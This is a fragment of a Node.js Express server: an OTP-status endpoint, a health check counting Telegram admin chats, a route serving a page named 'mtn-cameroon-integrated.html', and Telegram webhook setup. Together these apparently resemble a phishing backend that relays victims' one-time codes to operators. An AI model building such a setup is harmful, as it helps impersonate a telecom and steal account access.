        const application = await db.getApplication(req.params.applicationId);
        if (application) res.json({ success: true, status: application.otpStatus });
        else res.status(404).json({ success: false, message: 'Application not found' });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// GET /health
app.get('/health', (req, res) => {
    res.json({
        status:       'ok',
        database:     dbReady ? 'connected' : 'not ready',
        activeAdmins: adminChatIds.size,
        timestamp:    new Date().toISOString()
    });
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'mtn-cameroon-integrated.html'));
});

// ==========================================
// START SERVER & CONNECT DB
// ==========================================
app.listen(PORT, () => {
    console.log(`\n🌐 Server active on port ${PORT}`);
});

db.connectDatabase()
    .then(async () => {
        dbReady = true;
        console.log('✅ Database connected!');
        await loadAdminChatIds();

        const fullWebhookUrl = `${WEBHOOK_URL}${webhookPath}`;
        await bot.setWebHook(fullWebhookUrl, {
            drop_pending_updates: false,
            max_connections: 40,
            allowed_updates: ['message', 'callback_query']
        }).catch(err => console.error('⚠️ Webhook set warning:', err.message));

        console.log(`✅ Webhook set to: ${fullWebhookUrl}`);
    })
    .catch((error) => {
        console.error('❌ DB connection failed:', error);
    });

// Graceful shutdown
process.on('SIGTERM', async () => {
    await db.closeDatabase().catch(() => {});
    process.exit(0);
});
